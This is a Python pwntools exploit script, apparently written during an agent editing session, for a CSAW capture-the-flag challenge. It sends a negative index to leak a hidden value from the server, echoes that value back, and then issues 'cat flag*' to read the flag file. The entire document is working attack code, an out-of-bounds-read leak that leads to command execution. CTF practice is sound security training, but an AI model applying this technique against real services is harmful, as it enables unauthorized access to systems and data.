from pwn import *

HOST = "pwn.chal.csaw.io"
PORT = 5000

def run():
    p = remote(HOST, PORT)
    p.recvuntil(b"Which haystack do you want to check?")
    p.sendline(b"-3")
    out = p.recvuntil(b"Which haystack do you want to check?")
    print(out.decode("latin-1", errors="replace"))

    marker = b"number is 0x"
    i = out.find(marker)
    if i == -1:
        print("no leak found")
        p.close()
        return False

    leak_hex = out[i + len(marker): i + len(marker) + 8].decode()
    leak = int(leak_hex, 16)
    print(f"leak={leak:#x}")

    p.sendline(str(leak).encode())
    out2 = p.recv(timeout=1)
    print(out2.decode("latin-1", errors="replace"))

    if b"Hey you found a needle! And its number is" in out2:
        p.sendline(b"cat flag*")
        final = p.recvall(timeout=2)
        print(final.decode("latin-1", errors="replace"))
        return True

    p.close()
    return False

run()
end_of_edit
